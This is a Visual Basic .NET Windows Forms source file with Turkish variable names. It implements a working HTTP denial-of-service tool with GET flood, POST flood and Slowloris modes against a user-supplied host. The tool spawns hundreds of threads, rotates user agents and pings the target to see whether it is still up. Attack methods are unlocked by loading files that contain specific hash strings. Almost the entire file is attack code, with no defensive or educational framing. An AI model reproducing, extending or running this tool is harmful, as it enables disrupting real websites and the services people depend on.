Imports System.Net.Sockets
Imports System.IO
Imports System.Text
Imports System.Net
Imports System.Threading
Public Class Form2
    Private thread As System.Threading.Thread
    Private coklu As System.Threading.Thread
    Private ping As System.Threading.Thread
     Private Sub threadget()
        Try
            '
            txtDenenen.Text += 1
            Dim denenen As Integer = txtDenenen.Text
            Dim limitdizisi As Integer = txtSaldirganlimiti.Text
            If denenen > limitdizisi Then
                txtDenenen.Text = 0
                denenen = 0
            End If
            '
            Dim host As String = txtHost.Text
            '
            If chkSSL.Checked = True Then
                Dim soket(limitdizisi) As Socket
                soket(denenen) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                soket(denenen).Connect(host, 443)

                Dim stream(limitdizisi) As Security.SslStream
                stream(denenen) = New Security.SslStream(New Sockets.NetworkStream(soket(denenen)))
                stream(denenen).AuthenticateAsClient(host)
                '
                While True
                    '
                    If txtDurum.Text = 1 Then
                        txtHatadurum.ForeColor = Color.Lime 'sonradan silinecek
                        '
                        Try
                            listboxUserAgent.SelectedIndex += 1
                        Catch ex As Exception
                            listboxUserAgent.SelectedIndex = 0
                        End Try
                        '
                        Dim headerGET As String
                        If txtCookies.Text = "" Then
                            headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & vbCrLf
                        Else
                            headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & vbCrLf
                        End If
                        stream(denenen).Write(Encoding.Default.GetBytes(headerGET), 0, headerGET.Length)
                        System.Threading.Thread.Sleep(50)

                        Dim buffer(1024) As Byte
                        Dim miktar As Integer
                        miktar = stream(denenen).Read(buffer, 0, buffer.Length)
                        Dim son As String = Encoding.Default.GetString(buffer, 0, miktar)
                        txtReceive.Text = son 'sonradan silinecek

                        System.Threading.Thread.Sleep(50)

                        txtIndirilen.Text += miktar / 1024
                    Else
                        thread.Abort()
                    End If
                    '
                End While
            Else
                Dim soket(limitdizisi) As Socket
                soket(denenen) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                soket(denenen).Connect(host, 80)

                Dim stream(limitdizisi) As NetworkStream
                stream(denenen) = New NetworkStream(soket(denenen))
                '
                While True
                    '
                    If txtDurum.Text = 1 Then
                        txtHatadurum.ForeColor = Color.Lime 'sonradan silinecek
                        '
                        Try
                            listboxUserAgent.SelectedIndex += 1
                        Catch ex As Exception
                            listboxUserAgent.SelectedIndex = 0
                        End Try
                        '
                        Dim headerGET As String
                        If txtCookies.Text = "" Then
                            headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & vbCrLf
                        Else
                            headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & vbCrLf
                        End If
                        stream(denenen).Write(Encoding.Default.GetBytes(headerGET), 0, headerGET.Length)
                        System.Threading.Thread.Sleep(50)

                        Dim buffer(1024) As Byte
                        Dim miktar As Integer
                        miktar = stream(denenen).Read(buffer, 0, buffer.Length)
                        Dim son As String = Encoding.Default.GetString(buffer, 0, miktar)
                        txtReceive.Text = son 'sonradan silinecek

                        System.Threading.Thread.Sleep(50)

                        txtIndirilen.Text += miktar / 1024
                    Else
                        thread.Abort()
                    End If
                    '
                End While
            End If
            
            '
        Catch ex As Exception
            Try
                txtHatadurum.Text = ex.Message 'sonradan silinecek
                txtHatadurum.ForeColor = Color.Red 'sonradan silinecek
                txtOluSaldirganlar.Text += 1
                Dim aktifsaldirganlar As Integer = txtSaldirganlar.Text - txtOluSaldirganlar.Text ' "" hatası veren yer
                If aktifsaldirganlar >= 0 Then
                    txtAktifSaldirganlar.Text = aktifsaldirganlar
                Else
                    txtAktifSaldirganlar.Text = 0
                End If
                System.Threading.Thread.Sleep(100)
            Catch ex2 As Exception
            End Try      
        End Try
        Me.Refresh()
    End Sub
    Private Sub threadpost()
        Try
            '
            txtDenenen.Text += 1
            Dim denenen As Integer = txtDenenen.Text
            Dim limitdizisi As Integer = txtSaldirganlimiti.Text
            If denenen > limitdizisi Then
                txtDenenen.Text = 0
                denenen = 0
            End If
            '
            Dim host As String = txtHost.Text
            '
            If chkSSL.Checked = True Then
                Dim soket(limitdizisi) As Socket
                soket(denenen) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                soket(denenen).Connect(host, 443)

                Dim stream(limitdizisi) As Security.SslStream
                stream(denenen) = New Security.SslStream(New Sockets.NetworkStream(soket(denenen)))
                stream(denenen).AuthenticateAsClient(host)
                '
                While True
                    '
                    If txtDurum.Text = 1 Then
                        txtHatadurum.ForeColor = Color.Lime 'sonradan silinecek
                        '
                        Try
                            listboxUserAgent.SelectedIndex += 1
                        Catch ex As Exception
                            listboxUserAgent.SelectedIndex = 0
                        End Try
                        '
                        Dim headerPOST As String
                        If txtCookies.Text = "" Then
                            headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                        Else
                            headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                        End If
                        stream(denenen).Write(Encoding.Default.GetBytes(headerPOST), 0, headerPOST.Length)
                        System.Threading.Thread.Sleep(50)

                        Dim buffer(1024) As Byte
                        Dim miktar As Integer
                        miktar = stream(denenen).Read(buffer, 0, buffer.Length)
                        Dim son As String = Encoding.Default.GetString(buffer, 0, miktar)
                        txtReceive.Text = son 'sonradan silinecek
                        System.Threading.Thread.Sleep(100)
                        txtIndirilen.Text += miktar / 1024
                    Else
                        thread.Abort()
                    End If
                    '
                End While
            Else
                Dim soket(limitdizisi) As Socket
                soket(denenen) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                soket(denenen).Connect(host, 80)

                Dim stream(limitdizisi) As NetworkStream
                stream(denenen) = New NetworkStream(soket(denenen))
                '
                While True
                    '
                    If txtDurum.Text = 1 Then
                        txtHatadurum.ForeColor = Color.Lime 'sonradan silinecek
                        '
                        Try
                            listboxUserAgent.SelectedIndex += 1
                        Catch ex As Exception
                            listboxUserAgent.SelectedIndex = 0
                        End Try
                        '
                        Dim headerPOST As String
                        If txtCookies.Text = "" Then
                            headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                        Else
                            headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                        End If
                        stream(denenen).Write(Encoding.Default.GetBytes(headerPOST), 0, headerPOST.Length)
                        System.Threading.Thread.Sleep(50)

                        Dim buffer(1024) As Byte
                        Dim miktar As Integer
                        miktar = stream(denenen).Read(buffer, 0, buffer.Length)
                        Dim son As String = Encoding.Default.GetString(buffer, 0, miktar)
                        txtReceive.Text = son 'sonradan silinecek
                        System.Threading.Thread.Sleep(100)
                        txtIndirilen.Text += miktar / 1024
                    Else
                        thread.Abort()
                    End If
                    '
                End While
            End If
            
            '
        Catch ex As Exception
            Try
                txtHatadurum.Text = ex.Message 'sonradan silinecek
                txtHatadurum.ForeColor = Color.Red 'sonradan silinecek
                txtOluSaldirganlar.Text += 1
                Dim aktifsaldirganlar As Integer = txtSaldirganlar.Text - txtOluSaldirganlar.Text ' "" hatası veren yer
                If aktifsaldirganlar >= 0 Then
                    txtAktifSaldirganlar.Text = aktifsaldirganlar
                Else
                    txtAktifSaldirganlar.Text = 0
                End If
                System.Threading.Thread.Sleep(100)
            Catch ex2 As Exception
            End Try
        End Try
        Me.Refresh()
    End Sub
    Private Sub threadslow()
        Try
            '
            txtDenenen.Text += 1
            Dim denenen As Integer = txtDenenen.Text
            Dim limitdizisi As Integer = txtSaldirganlimiti.Text
            If denenen > limitdizisi Then
                txtDenenen.Text = 0
                denenen = 0
            End If
            '
            Dim host As String = txtHost.Text
            If chkSSL.Checked = True Then
                Dim soket(limitdizisi) As Socket
                soket(denenen) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                soket(denenen).Connect(host, 443)

                Dim stream(limitdizisi) As Security.SslStream
                stream(denenen) = New Security.SslStream(New Sockets.NetworkStream(soket(denenen)))
                stream(denenen).AuthenticateAsClient(host)
                '
                While True
                    '
                    txtHatadurum.ForeColor = Color.Lime 'sonradan silinecek
                    Try
                        listboxUserAgent.SelectedIndex += 1
                    Catch ex As Exception
                        listboxUserAgent.SelectedIndex = 0
                    End Try
                    '
                    Dim headerSLOW As String
                    If txtCookies.Text = "" Then
                        headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf & "a" & vbCrLf & vbCrLf
                    Else
                        headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf & "a" & vbCrLf & vbCrLf
                    End If
                    '
                    stream(denenen).Write(Encoding.Default.GetBytes(headerSLOW), 0, headerSLOW.Length)
                    '
                    For i = 1 To 10000
                        If txtDurum.Text = 1 Then
                            Dim harf As String() = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "r", "s", "t", "u", "v", "y", "z"}
                            Randomize()
                            Dim data As String = harf(Rnd() * 22)
                            stream(denenen).Write(Encoding.Default.GetBytes(data), 0, data.Length)
                            System.Threading.Thread.Sleep(1000)
                        Else
                            thread.Abort()
                        End If
                    Next
                    '
                    Dim buffer(1024) As Byte
                    Dim miktar As Integer
                    miktar = stream(denenen).Read(buffer, 0, buffer.Length)
                    Dim son As String = Encoding.Default.GetString(buffer, 0, miktar)
                    txtReceive.Text = son 'sonradan silinecek
                    System.Threading.Thread.Sleep(100)
                    txtIndirilen.Text += miktar / 1024
                    '
                End While
            Else
                Dim soket(limitdizisi) As Socket
                soket(denenen) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                soket(denenen).Connect(host, 80)

                Dim stream(limitdizisi) As NetworkStream
                stream(denenen) = New NetworkStream(soket(denenen))
                '
                While True
                    '
                    txtHatadurum.ForeColor = Color.Lime 'sonradan silinecek
                    Try
                        listboxUserAgent.SelectedIndex += 1
                    Catch ex As Exception
                        listboxUserAgent.SelectedIndex = 0
                    End Try
                    '
                    Dim headerSLOW As String
                    If txtCookies.Text = "" Then
                        headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf & "a" & vbCrLf & vbCrLf
                    Else
                        headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf & "a" & vbCrLf & vbCrLf
                    End If
                    '
                    stream(denenen).Write(Encoding.Default.GetBytes(headerSLOW), 0, headerSLOW.Length)
                    '
                    For i = 1 To 10000
                        If txtDurum.Text = 1 Then
                            Dim harf As String() = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "r", "s", "t", "u", "v", "y", "z"}
                            Randomize()
                            Dim data As String = harf(Rnd() * 22)
                            stream(denenen).Write(Encoding.Default.GetBytes(data), 0, data.Length)
                            System.Threading.Thread.Sleep(1000)
                        Else
                            thread.Abort()
                        End If
                    Next
                    '
                    Dim buffer(1024) As Byte
                    Dim miktar As Integer
                    miktar = stream(denenen).Read(buffer, 0, buffer.Length)
                    Dim son As String = Encoding.Default.GetString(buffer, 0, miktar)
                    txtReceive.Text = son 'sonradan silinecek
                    System.Threading.Thread.Sleep(100)
                    txtIndirilen.Text += miktar / 1024
                    '
                End While
            End If
            '
            '
        Catch ex As Exception
            Try
                txtHatadurum.Text = ex.Message 'sonradan silinecek
                txtHatadurum.ForeColor = Color.Red 'sonradan silinecek
                txtOluSaldirganlar.Text += 1
                Dim aktifsaldirganlar As Integer = txtSaldirganlar.Text - txtOluSaldirganlar.Text ' "" hatası veren yer
                If aktifsaldirganlar >= 0 Then
                    txtAktifSaldirganlar.Text = aktifsaldirganlar
                Else
                    txtAktifSaldirganlar.Text = 0
                End If
                System.Threading.Thread.Sleep(100)
            Catch ex2 As Exception
            End Try
        End Try
        Me.Refresh()
    End Sub
    Private Sub cokluthread()
        On Error Resume Next
        txtSaldirganlar.Text = 0
        While True
            If txtDurum.Text = 1 Then
                If ListBox1.Items.Contains("Get Flood") Then
                    Dim limit As Integer = txtSaldirganlimiti.Text
                    Dim aktifsaldirganlar As Integer = txtAktifSaldirganlar.Text
                    If limit > aktifsaldirganlar Then
                        Dim saldirgansay As Integer = txtSaldirganlar.Text
                        Dim th(saldirgansay) As Thread
                        th(saldirgansay) = New System.Threading.Thread(AddressOf threadget)
                        th(saldirgansay).Start()
                        txtSaldirganlar.Text += 1
                        Dim aktifsaldirganlar_guncel As Integer = txtSaldirganlar.Text - txtOluSaldirganlar.Text
                        txtAktifSaldirganlar.Text = aktifsaldirganlar_guncel
                        System.Threading.Thread.Sleep(1000 / txtSaldirganhiz.Text)
                    End If
                End If
                If ListBox1.Items.Contains("Post Flood") Then
                    Dim limit As Integer = txtSaldirganlimiti.Text
                    Dim aktifsaldirganlar As Integer = txtAktifSaldirganlar.Text
                    If limit > aktifsaldirganlar Then
                        Dim saldirgansay As Integer = txtSaldirganlar.Text
                        Dim th(saldirgansay) As Thread
                        th(saldirgansay) = New System.Threading.Thread(AddressOf threadpost)
                        th(saldirgansay).Start()
                        txtSaldirganlar.Text += 1
                        Dim aktifsaldirganlar_guncel As Integer = txtSaldirganlar.Text - txtOluSaldirganlar.Text
                        txtAktifSaldirganlar.Text = aktifsaldirganlar_guncel
                        System.Threading.Thread.Sleep(1000 / txtSaldirganhiz.Text)
                    End If
                End If
                If ListBox1.Items.Contains("Slowloris") Then
                    Dim limit As Integer = txtSaldirganlimiti.Text
                    Dim aktifsaldirganlar As Integer = txtAktifSaldirganlar.Text
                    If limit > aktifsaldirganlar Then
                        Dim saldirgansay As Integer = txtSaldirganlar.Text
                        Dim th(saldirgansay) As Thread
                        th(saldirgansay) = New System.Threading.Thread(AddressOf threadslow)
                        th(saldirgansay).Start()
                        txtSaldirganlar.Text += 1
                        Dim aktifsaldirganlar_guncel As Integer = txtSaldirganlar.Text - txtOluSaldirganlar.Text
                        txtAktifSaldirganlar.Text = aktifsaldirganlar_guncel
                        System.Threading.Thread.Sleep(1000 / txtSaldirganhiz.Text)
                    End If
                End If
            Else
                coklu.Abort()
            End If
        End While
        Me.Refresh()
    End Sub
    Private Sub pinghttp()
        On Error Resume Next
        While True
            If txtDurum.Text = 1 Then
                If My.Computer.Network.Ping(txtHost.Text, txtTimeout.Text) Then
                    Panel1.BackColor = Color.Lime
                Else
                    Panel1.BackColor = Color.Red
                End If
            Else
                ping.Abort()
            End If
        End While
        Me.Refresh()
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles btnDosyaAc.Click
        OpenFileDialog1.ShowDialog()
    End Sub

    Private Sub OpenFileDialog1_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk
        RichTextBox2.Text = System.IO.File.ReadAllText(OpenFileDialog1.FileName, System.Text.Encoding.Default)
        txtYontemsayi.Text = ListBox1.Items.Count
        txt_Durum_SaldiriYontemleri.Text = ListBox1.Items.Count
        ListBox1.SelectedIndex = ListBox1.Items.Count - 1
        If txtYontemsayi.Text = 1 Then
            btnSil1.Visible = True
        ElseIf txtYontemsayi.Text = 2 Then
            btnSil2.Visible = True
        ElseIf txtYontemsayi.Text = 3 Then
            btnSil3.Visible = True
        End If
    End Sub
    Private Sub RichTextBox2_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox2.TextChanged
        If RichTextBox2.Text = "f924c61ab691ea68c4eb3eeaba8a4352" Then
            If ListBox1.Items.Contains("Post Flood") Then
                MsgBox("Post Flood Yöntemi Zaten Mevcut", MsgBoxStyle.Critical, "Hata")
            Else
                ListBox1.Items.Add("Post Flood")
                My.Computer.Audio.Play(My.Resources.correct, AudioPlayMode.Background)
            End If
        End If
        If RichTextBox2.Text = "df31340a685133d0f76a076e6cc11aa1" Then
            If ListBox1.Items.Contains("Get Flood") Then
                MsgBox("Get Flood Yöntemi Zaten Mevcut", MsgBoxStyle.Critical, "Hata")
            Else
                ListBox1.Items.Add("Get Flood")
                My.Computer.Audio.Play(My.Resources.correct, AudioPlayMode.Background)
            End If
        End If
        If RichTextBox2.Text = "5557bd52b399c9a7d0df74f3302c9661" Then
            If ListBox1.Items.Contains("Slowloris") Then
                MsgBox("Slowloris Yöntemi Zaten Mevcut", MsgBoxStyle.Critical, "Hata")
            Else
                ListBox1.Items.Add("Slowloris")
                My.Computer.Audio.Play(My.Resources.correct, AudioPlayMode.Background)
            End If
        End If
    End Sub

    Private Sub btnBasla_Click(sender As Object, e As EventArgs) Handles btnBasla.Click
        If ListBox1.Items.Count = 0 Then
            MsgBox("Lütfen Bir Saldırı Yöntemi Seçiniz", MsgBoxStyle.Critical, "Hata")
            txtHatasay.Text += 1
        End If
        If txtHost.Text = "www.example.com" Then
            MsgBox("Lütfen Düzgün Bir Host Adresi Yazınız", MsgBoxStyle.Critical, "Hata")
            txtHatasay.Text += 1
        End If
        If txtHatasay.Text = 0 Then
            btnBasla.Enabled = False
            btnDur.Enabled = True
            btnSil1.Enabled = False
            btnSil2.Enabled = False
            btnSil3.Enabled = False
            btnDosyaAc.Enabled = False
            ListBox1.Enabled = False
            txtHost.Enabled = False
            txtReferer.Enabled = False
            txtCookies.Enabled = False
            txtData.Enabled = False
            txtURL.Enabled = False
            chkSSL.Enabled = False
            chkSSL.BackColor = Color.Gray
            Panel1.BackColor = Color.Gray

            txtSaldirganlar.Text = 0
            txtAktifSaldirganlar.Text = 0
            txtOluSaldirganlar.Text = 0
            txtDenenen.Text = 0
            txtIndirilen.Text = 0
            txtReceive.Text = ""
            txtDurum.Text = 1
            coklu = New System.Threading.Thread(AddressOf cokluthread)
            coklu.Start()
            ping = New System.Threading.Thread(AddressOf pinghttp)
            ping.Start()
        End If
        txtHatasay.Text = 0
    End Sub

    Private Sub txtHost_TextChanged(sender As Object, e As EventArgs) Handles txtHost.TextChanged
        If chkSSL.Checked = True Then
            txtReferer.Text = "https://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "https://" & txtHost.Text & txtURL.Text
        ElseIf chkSSL.Checked = False Then
            txtReferer.Text = "http://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "http://" & txtHost.Text & txtURL.Text
        End If
    End Sub

    Private Sub chkSSL_CheckedChanged(sender As Object, e As EventArgs) Handles chkSSL.CheckedChanged
        If chkSSL.Checked = True Then
            txtReferer.Text = "https://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "https://" & txtHost.Text & txtURL.Text
        ElseIf chkSSL.Checked = False Then
            txtReferer.Text = "http://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "http://" & txtHost.Text & txtURL.Text
        End If
    End Sub

    Private Sub txtURL_TextChanged(sender As Object, e As EventArgs) Handles txtURL.TextChanged
        If chkSSL.Checked = True Then
            txtReferer.Text = "https://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "https://" & txtHost.Text & txtURL.Text
        ElseIf chkSSL.Checked = False Then
            txtReferer.Text = "http://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "http://" & txtHost.Text & txtURL.Text
        End If
    End Sub
    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Dim saldirganhiz As Integer = 50
        Dim saldirganlimiti As Integer = 500
        Dim timeout As Integer = 5000
        Dim yontemsayi As Integer = 0
        Dim saldirganlar As Integer = 0
        Dim olusaldirganlar As Integer = 0
        Dim hatasay As Integer = 0
        Dim denenen As Integer = 0
        Dim durum As Integer = 0
        txtSaldirganhiz.Text = saldirganhiz
        txtSaldirganlimiti.Text = saldirganlimiti
        txtTimeout.Text = timeout
        txtYontemsayi.Text = yontemsayi
        txtSaldirganlar.Text = saldirganlar
        txtOluSaldirganlar.Text = olusaldirganlar
        txtHatasay.Text = hatasay
        txtDenenen.Text = denenen
        txtDurum.Text = durum
        listboxUserAgent.SelectedIndex = 0
    End Sub

    Private Sub btnDur_Click(sender As Object, e As EventArgs) Handles btnDur.Click
        txtDurum.Text = 0
        btnBasla.Enabled = True
        btnDur.Enabled = False
        btnDosyaAc.Enabled = True
        btnSil1.Enabled = True
        btnSil2.Enabled = True
        btnSil3.Enabled = True
        ListBox1.Enabled = True
        txtHost.Enabled = True
        txtReferer.Enabled = True
        txtCookies.Enabled = True
        txtData.Enabled = True
        txtURL.Enabled = True
        chkSSL.Enabled = True
        chkSSL.BackColor = Color.Black
        If CheckBox1.Checked = True Then
            Form3.Show()
        End If
        'MsgBox("Lütfen Saldırı Tamamen Durmadan Yeni Bir Saldırı Başlatmayınız.", MsgBoxStyle.Information, "Uyarı")
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
        If ListBox1.SelectedItem = "Slowloris" Then
            Label7.Visible = False
            Header.Visible = True
            txtUyari.Visible = False
            txtData.Visible = False
            txtCookies.Height = 155
            Header.Text = "Slowloris Header Ayarları"
        ElseIf ListBox1.SelectedItem = "Get Flood" Then
            Label7.Visible = False
            Header.Visible = True
            txtUyari.Visible = False
            txtData.Visible = False
            txtCookies.Height = 155
            Header.Text = "Get Header Ayarları"
        ElseIf ListBox1.SelectedItem = "Post Flood" Then
            Label7.Visible = True
            Header.Visible = True
            txtUyari.Visible = False
            txtData.Visible = True
            txtCookies.Height = 75
            Header.Text = "Post Header Ayarları"
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles btnSil1.Click
        If txtYontemsayi.Text = 3 Then
            btnSil3.Visible = False
        ElseIf txtYontemsayi.Text = 2 Then
            btnSil2.Visible = False
        ElseIf txtYontemsayi.Text = 1 Then
            btnSil1.Visible = False
            Header.Visible = False
            txtUyari.Visible = True
        End If
        ListBox1.Items.RemoveAt(0)
        txt_Durum_SaldiriYontemleri.Text -= 1
        txtYontemsayi.Text -= 1
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles btnSil2.Click
        If txtYontemsayi.Text = 3 Then
            btnSil3.Visible = False
        ElseIf txtYontemsayi.Text = 2 Then
            btnSil2.Visible = False
        ElseIf txtYontemsayi.Text = 1 Then
            btnSil1.Visible = False
            Header.Visible = False
            txtUyari.Visible = True
        End If
        ListBox1.Items.RemoveAt(1)
        txt_Durum_SaldiriYontemleri.Text -= 1
        txtYontemsayi.Text -= 1
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles btnSil3.Click
        If txtYontemsayi.Text = 3 Then
            btnSil3.Visible = False
        ElseIf txtYontemsayi.Text = 2 Then
            btnSil2.Visible = False
        ElseIf txtYontemsayi.Text = 1 Then
            btnSil1.Visible = False
            Header.Visible = False
            txtUyari.Visible = True
        End If
        ListBox1.Items.RemoveAt(2)
        txt_Durum_SaldiriYontemleri.Text -= 1
        txtYontemsayi.Text -= 1
    End Sub
End Class
